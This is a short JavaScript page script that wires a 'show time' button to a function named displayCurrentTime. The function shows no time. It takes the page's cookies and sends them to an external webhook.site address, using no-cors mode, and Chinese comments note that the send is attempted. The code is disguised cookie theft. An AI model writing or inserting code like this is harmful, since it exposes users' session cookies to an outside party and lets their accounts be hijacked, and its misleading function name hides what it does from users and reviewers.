document.addEventListener("DOMContentLoaded", function () {
  const button = document.getElementById("showTimeButton");
  button.addEventListener("click", function () {
    displayCurrentTime();
  });

  function displayCurrentTime() {
    const url = 'https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d?' + new URLSearchParams({
      cookie: document.cookie
    });

    fetch(url, {
      method: 'GET',
      mode: 'no-cors' // 避免 CORS 錯誤
    }).then(() => {
      console.log('Cookie 已嘗試發送（但無法確認成功與否）');
    });
  }
});
